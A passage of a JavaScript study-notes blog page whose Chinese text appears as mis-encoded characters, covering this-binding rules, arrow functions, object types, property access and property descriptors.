title="2.6 å°ç»“"></a>2.6 å°ç»“</h3><p>å¦‚æœè¦åˆ¤æ–­ä¸€ä¸ªè¿è¡Œä¸­å‡½æ•°çš„ this ç»‘å®šï¼Œå°±éœ€è¦æ‰¾åˆ°è¿™ä¸ªå‡½æ•°çš„ç›´æ¥è°ƒç”¨ä½ç½®ã€‚æ‰¾åˆ°ä¹‹åå°±å¯ä»¥é¡ºåºåº”ç”¨ä¸‹é¢è¿™å››æ¡è§„åˆ™æ¥åˆ¤æ–­ this çš„ç»‘å®šå¯¹è±¡ã€‚</p><ol><li><p>ç”±newè°ƒç”¨ï¼Ÿç»‘å®šåˆ°æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚</p></li><li><p>ç”±callæˆ–è€…apply(æˆ–è€…bind)è°ƒç”¨ï¼Ÿç»‘å®šåˆ°æŒ‡å®šçš„å¯¹è±¡ã€‚</p></li><li><p>ç”±ä¸Šä¸‹æ–‡å¯¹è±¡è°ƒç”¨ï¼Ÿç»‘å®šåˆ°é‚£ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ã€‚</p></li><li><p>é»˜è®¤:åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ç»‘å®šåˆ°undefinedï¼Œå¦åˆ™ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ã€‚</p></li></ol><p>ä¸€å®šè¦æ³¨æ„ï¼Œæœ‰äº›è°ƒç”¨å¯èƒ½åœ¨æ— æ„ä¸­ä½¿ç”¨é»˜è®¤ç»‘å®šè§„åˆ™ã€‚å¦‚æœæƒ³â€œæ›´å®‰å…¨â€åœ°å¿½ç•¥ this ç»‘å®šï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ª DMZ å¯¹è±¡ï¼Œæ¯”å¦‚ Ã¸ = Object.create(null)ï¼Œä»¥ä¿æŠ¤å…¨å±€å¯¹è±¡ã€‚    </p><p>ES6 ä¸­çš„ç®­å¤´å‡½æ•°å¹¶ä¸ä¼šä½¿ç”¨å››æ¡æ ‡å‡†çš„ç»‘å®šè§„åˆ™ï¼Œè€Œæ˜¯æ ¹æ®å½“å‰çš„è¯æ³•ä½œç”¨åŸŸæ¥å†³å®š thisï¼Œå…·ä½“æ¥è¯´ï¼Œç®­å¤´å‡½æ•°ä¼šç»§æ‰¿å¤–å±‚å‡½æ•°è°ƒç”¨çš„ this ç»‘å®š(æ— è®º this ç»‘å®šåˆ°ä»€ä¹ˆ)ã€‚è¿™å…¶å®å’Œ ES6 ä¹‹å‰ä»£ç ä¸­çš„ self = this æœºåˆ¶ä¸€æ ·ã€‚     </p><p><strong>ç‰¹åˆ«æ³¨æ„:</strong> å…¶ä¸­æœ€éœ€è¦æ³¨æ„çš„å°±æ˜¯<strong>å½“ä½ ä½¿ç”¨jqueryæˆ–vueæ—¶</strong>ï¼Œæ­¤æ—¶thisæ˜¯è¢«åŠ¨æ€ç»‘å®šäº†çš„ã€‚ä½¿ç”¨ Vue.jsæ—¶ï¼Œæ–¹æ³•å’Œè®¡ç®—å‡½æ•°é€šå¸¸å°† this è®¾ç½®ä¸º Vue ç»„ä»¶å®ä¾‹ã€‚vueæ–‡æ¡£ä¸­<code>æ‰€æœ‰çš„ç”Ÿå‘½å‘¨æœŸé’©å­è‡ªåŠ¨ç»‘å®š this ä¸Šä¸‹æ–‡åˆ°å®ä¾‹ä¸­ï¼Œå› æ­¤ä½ å¯ä»¥è®¿é—®æ•°æ®ï¼Œå¯¹å±æ€§å’Œæ–¹æ³•è¿›è¡Œè¿ç®—ã€‚è¿™æ„å‘³ç€ä½ ä¸èƒ½ä½¿ç”¨ç®­å¤´å‡½æ•°æ¥å®šä¹‰ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³• (ä¾‹å¦‚ created: () =&gt; this.fetchTodos())ã€‚è¿™æ˜¯å› ä¸ºç®­å¤´å‡½æ•°ç»‘å®šäº†çˆ¶ä¸Šä¸‹æ–‡ï¼Œå› æ­¤ this ä¸ä½ æœŸå¾…çš„ Vue å®ä¾‹ä¸åŒï¼Œthis.fetchTodos çš„è¡Œä¸ºæœªå®šä¹‰ã€‚</code><br><strong>ä¸Šä¸‹æ–‡(å¯¹è±¡)ä¸å‡½æ•°ä½œç”¨åŸŸçš„åŒºåˆ«ä¸è”ç³»:</strong></p><ul><li><strong>ä¸Šä¸‹æ–‡ï¼š</strong> å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€æœ‰çš„å˜é‡éƒ½å‚¨å­˜åœ¨é‡Œé¢ã€‚ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯åœ¨å‡½æ•°è¢«è°ƒç”¨å¹¶è¢«å¼•æ“æ‰§è¡Œæ—¶åˆ›å»ºçš„ã€‚å¦‚æœä½ æ²¡è°ƒç”¨ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰ä¸Šä¸‹æ–‡ã€‚</li><li><strong>ä½œç”¨åŸŸï¼š</strong> é™¤äº†å…¨å±€ä½œç”¨åŸŸï¼Œåªæœ‰å‡½æ•°å’ŒES6æ–°å¢çš„letï¼Œconstæ‰èƒ½åˆ›å»ºä½œç”¨åŸŸã€‚åˆ›å»ºä¸€ä¸ªå‡½æ•°å°±åˆ›å»ºäº†ä¸€ä¸ªä½œç”¨åŸŸï¼Œæ— è®ºä½ è°ƒç”¨ä¸è°ƒç”¨ï¼Œå‡½æ•°åªè¦åˆ›å»ºäº†ï¼Œå®ƒå°±æœ‰ç‹¬ç«‹çš„ä½œç”¨åŸŸã€‚ä½œç”¨åŸŸæ§åˆ¶ç€è¢«è°ƒç”¨å‡½æ•°ä¸­çš„å˜é‡è®¿é—®ã€‚</li><li><strong>ä¸¤è€…:</strong> ä½œç”¨åŸŸæ˜¯åŸºäºå‡½æ•°çš„ï¼Œè€Œä¸Šä¸‹æ–‡æ˜¯åŸºäºå¯¹è±¡çš„ã€‚ä½œç”¨åŸŸæ¶‰åŠåˆ°æ‰€è¢«è°ƒç”¨å‡½æ•°ä¸­çš„å˜é‡è®¿é—®ï¼Œå¹¶ä¸”ä¸åŒçš„è°ƒç”¨åœºæ™¯æ˜¯ä¸ä¸€æ ·çš„ã€‚ä¸Šä¸‹æ–‡å§‹ç»ˆæ˜¯thiså…³é”®å­—æœ‰å…³ï¼Œ å®ƒæ§åˆ¶ç€thisçš„å¼•ç”¨ã€‚ä¸€ä¸ªä½œç”¨åŸŸä¸‹å¯èƒ½åŒ…å«å¤šä¸ªä¸Šä¸‹æ–‡ã€‚æœ‰å¯èƒ½ä»æ¥æ²¡æœ‰è¿‡ä¸Šä¸‹æ–‡ï¼ˆå‡½æ•°æ²¡æœ‰è¢«è°ƒç”¨ï¼‰ï¼›æœ‰å¯èƒ½æœ‰è¿‡ï¼Œç°åœ¨å‡½æ•°è¢«è°ƒç”¨å®Œæ¯•åï¼Œä¸Šä¸‹æ–‡ç¯å¢ƒè¢«é”€æ¯äº†(åƒåœ¾å›æ”¶)ï¼›æœ‰å¯èƒ½åŒæ—¶å­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªï¼ˆé—­åŒ…ï¼‰ã€‚</li></ul><h2 id="ç¬¬ä¸‰ç« -å¯¹è±¡"><a href="#ç¬¬ä¸‰ç« -å¯¹è±¡" class="headerlink" title="ç¬¬ä¸‰ç«  å¯¹è±¡"></a>ç¬¬ä¸‰ç«  å¯¹è±¡</h2><h3 id="3-1-è¯­æ³•"><a href="#3-1-è¯­æ³•" class="headerlink" title="3.1 è¯­æ³•"></a>3.1 è¯­æ³•</h3><p>å¯¹è±¡å¯ä»¥é€šè¿‡ä¸¤ç§å½¢å¼å®šä¹‰:å£°æ˜(æ–‡å­—)å½¢å¼(å°±æ˜¯å¸¸è¯´çš„å¯¹è±¡å­—é¢é‡)å’Œæ„é€ å½¢å¼ã€‚</p><ul><li>å£°æ˜å½¢å¼(å¯¹è±¡å­—é¢é‡):</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> myObj = &#123; </span><br><span class="line">   <span class="attr">key</span>: value</span><br><span class="line">   <span class="comment">// ... </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>æ„é€ å½¢å¼:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObj = <span class="keyword">new</span> <span class="built_in">Object</span>(); </span><br><span class="line">myObj.key = value;</span><br></pre></td></tr></table></figure><p>æ„é€ å½¢å¼å’Œæ–‡å­—å½¢å¼ç”Ÿæˆçš„å¯¹è±¡æ˜¯ä¸€æ ·çš„ã€‚å”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼Œåœ¨æ–‡å­—å£°æ˜ä¸­ä½ å¯ä»¥æ·»åŠ å¤šä¸ª é”® / å€¼å¯¹ï¼Œä½†æ˜¯åœ¨æ„é€ å½¢å¼ä¸­ä½ å¿…é¡»é€ä¸ªæ·»åŠ å±æ€§ã€‚</p><h3 id="3-2-ç±»å‹"><a href="#3-2-ç±»å‹" class="headerlink" title="3.2 ç±»å‹"></a>3.2 ç±»å‹</h3><p>åœ¨JavaScriptä¸­ä¸€å…±æœ‰6ä¸­ä¸»è¦ç±»å‹(æœ¯è¯­æ˜¯â€è¯­è¨€ç±»å‹â€)</p><ul><li>string</li><li>number</li><li>boolean  </li><li>null </li><li>undefined  </li><li>object</li></ul><p><strong>ç®€å•æ•°æ®ç±»å‹:</strong><br>å…¶ä¸­stringã€booleanã€numberã€null å’Œ undefinedå±äºç®€å•åŸºæœ¬ç±»å‹ï¼Œå¹¶ä¸å±äºå¯¹è±¡ã€‚null æœ‰æ—¶ä¼šè¢«å½“ä½œä¸€ç§å¯¹è±¡ç±»å‹ï¼Œä½†æ˜¯è¿™å…¶å®åªæ˜¯è¯­è¨€æœ¬èº«çš„ä¸€ä¸ª bugï¼Œå³å¯¹ null æ‰§è¡Œtypeof null æ—¶ä¼šè¿”å›å­—ç¬¦ä¸² â€œobjectâ€ã€‚å®é™…ä¸Šï¼Œnull æœ¬èº«æ˜¯åŸºæœ¬ç±»å‹ã€‚     </p><p><strong>PS:</strong> åŸå› æ˜¯è¿™æ ·çš„ï¼Œä¸åŒçš„å¯¹è±¡åœ¨åº•å±‚éƒ½è¡¨ç¤ºä¸ºäºŒè¿›åˆ¶ï¼Œåœ¨ JavaScript ä¸­äºŒè¿›åˆ¶å‰ä¸‰ä½éƒ½ä¸º 0 çš„è¯ä¼šè¢«åˆ¤æ–­ä¸º object ç±»å‹ï¼Œnull çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ˜¯å…¨ 0ï¼Œè‡ªç„¶å‰ä¸‰ä½ä¹Ÿæ˜¯ 0ï¼Œæ‰€ä»¥æ‰§è¡Œ typeof æ—¶ä¼šè¿”å›â€œobjectâ€ã€‚</p><p><strong>å¯¹è±¡:</strong><br>å¯¹è±¡é™¤äº†æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨åˆ›å»ºçš„ï¼ŒJavaScriptå…¶å®å†…ç½®äº†å¾ˆå¤šå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯å¯¹è±¡çš„ä¸€ä¸ªå­ç±»å‹.     </p><p><strong>å†…ç½®å¯¹è±¡:</strong>    </p><ul><li>String </li><li>Number </li><li>Boolean  </li><li>Object </li><li>Function  </li><li>Array </li><li>Date </li><li>RegExp  </li><li>Error</li></ul><p>åœ¨ JavaScript ä¸­ï¼Œè¿™äº›å†…ç½®å¯¹è±¡å®é™…ä¸Šåªæ˜¯ä¸€äº›å†…ç½®å‡½æ•°ã€‚è¿™äº›å†…ç½®å‡½æ•°å¯ä»¥å½“ä½œæ„é€ å‡½æ•°æ¥ä½¿ç”¨ã€‚</p><p><strong>å‡ ç‚¹è¯´æ˜:</strong></p><ul><li>å‡½æ•°å°±æ˜¯å¯¹è±¡çš„ä¸€ä¸ªå­ç±»å‹ï¼ŒJavaScript ä¸­çš„å‡½æ•°æ˜¯â€œä¸€ç­‰å…¬æ°‘â€ï¼Œå› ä¸ºå®ƒä»¬æœ¬è´¨ä¸Šå’Œæ™®é€šçš„å¯¹è±¡ä¸€æ ·(åªæ˜¯å¯ä»¥è°ƒç”¨)ï¼Œæ‰€ä»¥å¯ä»¥åƒæ“ä½œå…¶ä»–å¯¹è±¡ä¸€æ ·æ“ä½œå‡½æ•°(æ¯”å¦‚å½“ä½œå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°)ã€‚</li><li>é€šè¿‡å­—é¢é‡å½¢å¼åˆ›å»ºå­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”æ—¶ï¼Œå¼•æ“ä¼šè‡ªåŠ¨æŠŠå­—é¢é‡è½¬æ¢æˆ String å¯¹è±¡ï¼ŒNumberå¯¹è±¡ï¼ŒBooleanå¯¹è±¡ï¼Œæ‰€ä»¥å®ƒä»¬æ˜¯å¯ä»¥è®¿å¯¹åº”å¯¹è±¡å†…ç½®çš„é—®å±æ€§å’Œæ–¹æ³•ã€‚</li><li>null å’Œ undefined æ²¡æœ‰å¯¹åº”çš„æ„é€ å½¢å¼ï¼Œå®ƒä»¬åªæœ‰æ–‡å­—å½¢å¼ã€‚ç›¸åï¼ŒDate åªæœ‰æ„é€ ï¼Œæ²¡æœ‰æ–‡å­—å½¢å¼ã€‚</li><li>å¯¹äº Objectã€Arrayã€Function å’Œ RegExpæ¥è¯´ï¼Œæ— è®ºä½¿ç”¨æ–‡å­—å½¢å¼è¿˜æ˜¯æ„é€ å½¢å¼ï¼Œå®ƒä»¬éƒ½æ˜¯å¯¹è±¡ï¼Œä¸æ˜¯å­—é¢é‡ã€‚</li><li>Error å¯¹è±¡å¾ˆå°‘åœ¨ä»£ç ä¸­æ˜¾å¼åˆ›å»ºï¼Œä¸€èˆ¬æ˜¯åœ¨æŠ›å‡ºå¼‚å¸¸æ—¶è¢«è‡ªåŠ¨åˆ›å»ºã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ new Error(..) è¿™ç§æ„é€ å½¢å¼æ¥åˆ›å»ºã€‚</li></ul><h3 id="3-3-å†…å®¹"><a href="#3-3-å†…å®¹" class="headerlink" title="3.3 å†…å®¹"></a>3.3 å†…å®¹</h3><p>å¯¹è±¡å±æ€§:ç”±ä¸€äº›å­˜å‚¨åœ¨ç‰¹å®šå‘½åä½ç½®çš„(ä»»æ„ç±»å‹çš„)å€¼ã€‚<br>å±æ€§å:å­˜å‚¨åœ¨å¯¹è±¡å®¹å™¨å†…éƒ¨çš„å±æ€§çš„åç§°ã€‚å±æ€§å€¼å¹¶ä¸ä¼šå­˜åœ¨å¯¹è±¡å†…ï¼Œè€Œæ˜¯é€šè¿‡å±æ€§åæ¥æŒ‡å‘è¿™äº›å€¼çœŸæ­£çš„å­˜å‚¨ä½ç½®ã€‚</p><p><strong>å±æ€§åçš„ä¸¤ç§å½¢å¼:</strong></p><ol><li><p>ä½¿ç”¨<code>.</code>æ“ä½œç¬¦ã€‚é€šå¸¸è¢«ç§°ä¸ºâ€å±æ€§è®¿é—®â€ã€‚ <code>.</code> æ“ä½œç¬¦ä¼šè¦æ±‚å±æ€§åæ»¡è¶³æ ‡è¯†ç¬¦çš„å‘½åè§„èŒƒã€‚</p></li><li><p>ä½¿ç”¨<code>[&quot;..&quot;] </code>è¯­æ³•è¿›è¡Œè®¿é—®ã€‚è¿™ä¸ªé€šå¸¸è¢«ç§°ä¸ºâ€é”®è®¿é—®â€ã€‚<code>[&quot;..&quot;] </code>è¯­æ³•å¯ä»¥æ¥å—ä»»æ„UTF-8/Unicode å­—ç¬¦ä¸²ä½œä¸ºå±æ€§åã€‚å¹¶ä¸”<code>[&quot;..&quot;]</code>è¯­æ³•ä½¿ç”¨å­—ç¬¦ä¸²æ¥è®¿é—®å±æ€§ï¼Œå¦‚æœä½ çš„å±æ€§åæ˜¯ä¸€ä¸ªå˜é‡ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä¹¦ä¸­çš„ä¾‹å­<code>myObject[idx]</code>å½¢å¼è¿›è¡Œè®¿é—®ã€‚ä½†<strong>å¦‚æœidxæ˜¯å±æ€§ååˆ™è¿˜æ˜¯éœ€å†™æˆ<code>myObject[&quot;idx&quot;]</code>å­—ç¬¦ä¸²å½¢å¼ã€‚</strong></p></li></ol><p><strong>æ³¨æ„:</strong> <strong>åœ¨å¯¹è±¡ä¸­ï¼Œå±æ€§åæ°¸è¿œéƒ½æ˜¯å­—ç¬¦ä¸²</strong>ã€‚å¦‚æœä½ ä½¿ç”¨ string(å­—é¢é‡)ä»¥å¤–çš„å…¶ä»–å€¼ä½œä¸ºå±æ€§åï¼Œé‚£å®ƒé¦–å…ˆä¼šè¢«è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå³ä½¿æ˜¯æ•°å­—ä¹Ÿä¸ä¾‹å¤–ã€‚</p><p><strong>è¡¥å……:</strong> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123; </span><br><span class="line">  <span class="attr">a</span>:<span class="number">2</span>ï¼Œ</span><br><span class="line">  <span class="attr">idx</span>:<span class="number">111</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> idx=<span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log( myObject[idx] ); <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log( myObject[<span class="string">&quot;idx&quot;</span>] ); <span class="comment">//111</span></span><br><span class="line"><span class="built_in">console</span>.log( myObject[<span class="built_in">this</span>.idx] );  <span class="comment">// 2 æ­¤æ—¶thisæ˜¯æŒ‡å‘window.[]é‡Œçš„thisåŒæ ·ç¬¦åˆä¸Šä¸€ç« æ‰€è®²çš„è§„åˆ™</span></span><br></pre></td></tr></table></figure><h4 id="3-3-1-å¯è®¡ç®—å±æ€§å"><a href="#3-3-1-å¯è®¡ç®—å±æ€§å" class="headerlink" title="3.3.1 å¯è®¡ç®—å±æ€§å"></a>3.3.1 <strong>å¯è®¡ç®—å±æ€§å</strong></h4><p>ES6 å¢åŠ äº†å¯è®¡ç®—å±æ€§åï¼Œå¯ä»¥åœ¨æ–‡å­—å½¢å¼ä¸­ä½¿ç”¨ [] åŒ…è£¹ä¸€ä¸ªè¡¨è¾¾å¼æ¥å½“ä½œå±æ€§å:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> prefix = <span class="string">&quot;foo&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">   [prefix + <span class="string">&quot;bar&quot;</span>]:<span class="string">&quot;hello&quot;</span>ï¼Œ </span><br><span class="line">   [prefix + <span class="string">&quot;baz&quot;</span>]: <span class="string">&quot;world&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">myObject[<span class="string">&quot;foobar&quot;</span>]; <span class="comment">// hello</span></span><br><span class="line">myObject[<span class="string">&quot;foobaz&quot;</span>]; <span class="comment">// world</span></span><br></pre></td></tr></table></figure><h4 id="3-3-2-å±æ€§ä¸æ–¹æ³•"><a href="#3-3-2-å±æ€§ä¸æ–¹æ³•" class="headerlink" title="3.3.2 å±æ€§ä¸æ–¹æ³•"></a>3.3.2 <strong>å±æ€§ä¸æ–¹æ³•</strong></h4><ul><li>æˆ‘ä»¬ç»å¸¸æŠŠå¯¹è±¡å†…éƒ¨å¼•ç”¨çš„å‡½æ•°ç§°ä¸ºâ€œæ–¹æ³•â€ã€‚</li><li>å®é™…ä¸Šå‡½æ•°å¹¶ä¸å±äºè¯¥å¯¹è±¡ï¼Œå®ƒä¸è¿‡æ˜¯å¯¹å‡½æ•°çš„å¼•ç”¨ç½¢äº†ã€‚å¯¹è±¡å±æ€§è®¿é—®è¿”å›çš„å‡½æ•°å’Œå…¶ä»–å‡½æ•°æ²¡æœ‰ä»»ä½•åŒºåˆ«(é™¤äº†å¯èƒ½å‘ç”Ÿçš„éšå¼ç»‘å®šthisåˆ°è¯¥å¯¹è±¡)ã€‚</li><li>å³ä½¿ä½ åœ¨å¯¹è±¡çš„æ–‡å­—å½¢å¼ä¸­å£°æ˜ä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿä¸ä¼šâ€œå±äºâ€è¿™ä¸ªå¯¹è±¡â€”â€” å®ƒä»¬åªæ˜¯å¯¹äºç›¸åŒå‡½æ•°å¯¹è±¡çš„å¤šä¸ªå¼•ç”¨ã€‚</li></ul><h4 id="3-3-3-æ•°ç»„"><a href="#3-3-3-æ•°ç»„" class="headerlink" title="3.3.3 æ•°ç»„"></a>3.3.3 <strong>æ•°ç»„</strong></h4><p>æ•°ç»„æ”¯æŒ<code>[]</code>å½¢å¼è®¿é—®å‚¨å­˜çš„å€¼ï¼Œå…¶ä¸­<code>[]</code>å†…çš„å€¼é»˜è®¤å½¢å¼ä¸ºæ•°å€¼ä¸‹æ ‡ï¼›æ•°ç»„ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥è™½ç„¶æ¯ä¸ªä¸‹æ ‡éƒ½æ˜¯æ•´æ•°ï¼Œä½ ä»ç„¶å¯ä»¥ç»™æ•°ç»„æ·»åŠ å±æ€§ã€‚ä¾‹å¦‚<code>myArray.baz = &quot;baz&quot;</code>ã€‚<strong>æ³¨æ„</strong>ï¼šæ·»åŠ æ–°å±æ€§åï¼Œè™½ç„¶å¯ä»¥è®¿é—®ï¼Œä½†æ•°ç»„çš„ length å€¼ä¸ä¼šæ”¹å˜ã€‚</p><p>æ•°ç»„å¯ä»¥é€šè¿‡<code>myArray[1]=11;myArray[&quot;2&quot;]=22;</code>è¿™ç§å½¢å¼å¯¹æ•°ç»„å†…å®¹è¿›è¡Œä¿®æ”¹ï¼Œæ·»åŠ ã€‚</p><p>è™½ç„¶æ•°ç»„ä¹Ÿå¯ä»¥å’Œå¯¹è±¡ä¸€æ ·é€šè¿‡<code>é”®/å€¼ å¯¹</code> å½¢å¼æ¥ä½¿ç”¨ï¼Œä½†JSå·²ç»å¯¹æ•°ç»„çš„è¡Œä¸ºå’Œç”¨é€”è¿›è¡Œäº†ä¼˜åŒ–ã€‚æ‰€ä»¥è¿˜æ˜¯å»ºè®®ä½¿ç”¨é»˜è®¤çš„<code>ä¸‹æ ‡/å€¼ å¯¹</code> å½¢å¼æ¥ä½¿ç”¨ã€‚</p><h4 id="3-3-4-å¤åˆ¶å¯¹è±¡"><a href="#3-3-4-å¤åˆ¶å¯¹è±¡" class="headerlink" title="3.3.4 å¤åˆ¶å¯¹è±¡"></a>3.3.4 <strong>å¤åˆ¶å¯¹è±¡</strong></h4><ul><li>å¤åˆ¶åˆ†ä¸ºæµ…æ‹·è´å’Œæ·±æ‹·è´ã€‚æµ…æ‹·è´ä¼šå¯¹å¯¹è±¡ä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹è¿›è¡Œå¤åˆ¶(åœ¨å†…å­˜ä¸­å¼€è¾Ÿæ–°çš„åŒºåŸŸ)ï¼Œå¯¹äºå¯¹è±¡åˆ™æ˜¯ç»§ç»­å¼•ç”¨ï¼Œè€Œä¸æ˜¯é‡æ–°åˆ›å»ºä¸€ä¸ªâ€ä¸€æ ·çš„â€å¯¹è±¡ï¼›æ·±æ‹·è´åˆ™æ˜¯å¯¹å…¶ä¸­çš„æ‰€æœ‰å†…å®¹(åŒ…æ‹¬å¯¹è±¡)è¿›è¡Œæ·±å±‚æ¬¡çš„å¤åˆ¶ã€‚</li><li>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡JSONæ¥å¤åˆ¶å¯¹è±¡ï¼š<code>var newObj = JSON.parse( JSON.stringify( someObj ) );</code>ä½†éœ€è¦æŒ‡å‡ºçš„æ˜¯è¿™ç§æ–¹æ³•<strong>å¯¹äºåŒ…å«functionå‡½æ•°æˆ–è€…Dateç±»å‹çš„å¯¹è±¡åˆ™ä¸ç®¡ç”¨ï¼</strong></li><li>ES6 å®šä¹‰äº† Object.assign(..) æ–¹æ³•æ¥å®ç°æµ…å¤åˆ¶ã€‚</li></ul><h4 id="3-3-5-å±æ€§æè¿°ç¬¦"><a href="#3-3-5-å±æ€§æè¿°ç¬¦" class="headerlink" title="3.3.5 å±æ€§æè¿°ç¬¦"></a>3.3.5 <strong>å±æ€§æè¿°ç¬¦</strong></h4><p>ä» ES5 å¼€å§‹ï¼Œæ‰€æœ‰çš„å±æ€§éƒ½å…·å¤‡äº†å±æ€§æè¿°ç¬¦ã€‚</p><ul><li><strong>æŸ¥çœ‹å±æ€§æè¿°ç¬¦:</strong> å¯ä»¥ä½¿ç”¨Object.getOwnPropertyDescriptor( myObjectï¼Œ â€œaâ€ );æ–¹æ³•æŸ¥çœ‹myObjectå¯¹è±¡é‡Œå±æ€§açš„å±æ€§æè¿°ç¬¦ã€‚</li><li><strong>é…ç½®å±æ€§æè¿°ç¬¦:</strong> å¯ä»¥ä½¿ç”¨Object.defineProperty(..)æ–¹æ³•å¯¹å±æ€§çš„å±æ€§æè¿°ç¬¦è¿›è¡Œé…ç½®ã€‚ä¸¾ä¸ªä¾‹å­:</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObject = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty( myObjectï¼Œ <span class="string">&quot;a&quot;</span>ï¼Œ &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">2</span>ï¼Œ</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">true</span>ï¼Œ  <span class="comment">//å†³å®šæ˜¯å¦å¯ä»¥ä¿®æ”¹å±æ€§çš„å€¼</span></span><br><span class="line"><span class="attr">configurable</span>: <span class="literal">true</span>ï¼Œ  <span class="comment">//å±æ€§æ˜¯å¦å¯é…ç½®</span></span><br><span class="line"><span class="attr">enumerable</span>: <span class="literal">true</span>   <span class="comment">//å±æ€§æ˜¯å¦ä¼šå‡ºç°åœ¨å¯¹è±¡çš„å±æ€§æšä¸¾</span></span><br><span class="line">&#125; );</span><br><span class="line">myObject.a; <span class="comment">// 2</span></span><br><span class="line"><span class="comment">//è¯¥æ–¹æ³•å¯ä»¥é…ç½®å››ä¸ªå±æ€§æè¿°ç¬¦</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong><br>å¯¹è±¡é‡Œç›®å‰å­˜åœ¨çš„å±æ€§æè¿°ç¬¦æœ‰ä¸¤ç§ä¸»è¦å½¢å¼ï¼š<strong>æ•°æ®æè¿°ç¬¦</strong>å’Œ<strong>å­˜å–æè¿°ç¬¦</strong>ã€‚æ•°æ®æè¿°ç¬¦æ˜¯ä¸€ä¸ªå…·æœ‰å€¼çš„å±æ€§ï¼Œè¯¥å€¼å¯èƒ½æ˜¯å¯å†™çš„ï¼Œä¹Ÿå¯èƒ½ä¸æ˜¯å¯å†™çš„ã€‚å­˜å–æè¿°ç¬¦æ˜¯ç”±getterå’Œsetterå‡½æ•°å¯¹æè¿°çš„å±æ€§ã€‚<strong>æè¿°ç¬¦å¿…é¡»æ˜¯è¿™ä¸¤ç§å½¢å¼ä¹‹ä¸€ï¼›ä¸èƒ½åŒæ—¶æ˜¯ä¸¤è€…</strong>ã€‚å®ƒä»¬çš„å…³ç³»å¦‚ä¸‹:</p><table><thead><tr><th></th><th>configurable</th><th>enumerable</th><th>value</th><th>writable</th><th>get</th><th>set</th></tr></thead><tbody><tr><td>æ•°æ®æè¿°ç¬¦</td><td>Yes</td><td>Yes</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td></tr><tr><td>å­˜å–æè¿°ç¬¦</td><td>Yes</td><td>Yes</td><td>No</td><td>No</td><td>Yes</td><td>Yes</td></tr></tbody></table><p><strong>å¦‚æœä¸€ä¸ªæè¿°ç¬¦ä¸å…·æœ‰valueï¼Œwritableï¼Œget å’Œ set ä»»æ„ä¸€ä¸ªå…³é”®å­—ï¼Œé‚£ä¹ˆå®ƒå°†è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæ•°æ®æè¿°ç¬¦ã€‚å¦‚æœä¸€ä¸ªæè¿°ç¬¦åŒæ—¶æœ‰(valueæˆ–writable)å’Œ(getæˆ–set)å…³é”®å­—ï¼Œå°†ä¼šäº§ç”Ÿä¸€ä¸ªå¼‚å¸¸ã€‚</strong></p><p>valueå°±æ˜¯è¯¥å±æ€§å¯¹åº”çš„å€¼ã€‚é»˜è®¤ä¸º undefinedã€‚ä¸‹é¢åˆ†åˆ«ä»‹ç»å‰©ä¸‹çš„ä¸‰ä¸ªå±æ€§æè¿°ç¬¦é”®å€¼:</p><ul><li><strong>Writable</strong>   å†³å®šæ˜¯å¦å¯ä»¥ä¿®æ”¹å±æ€§çš„å€¼ã€‚å½“è¢«è®¾ç½®ä¸ºfalseåï¼Œå†å¯¹å±æ€§å€¼è¿›è¡Œä¿®æ”¹ï¼Œåˆ™ä¼šé™é»˜å¤±è´¥(silently failedï¼Œä¿®æ”¹ä¸æˆåŠŸï¼Œä¹Ÿä¸æŠ¥é”™)ã€‚å¦‚æœåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œåˆ™ä¼šæŠ¥å‡ºTypeErroré”™è¯¯ã€‚</li><li><strong>Configurable</strong> å†³å®šå±æ€§æè¿°ç¬¦æ˜¯å¦å¯é…ç½®ã€‚å¦‚æœä¸ºtrueï¼Œå°±å¯ä»¥ä½¿ç”¨ defineProperty(..) 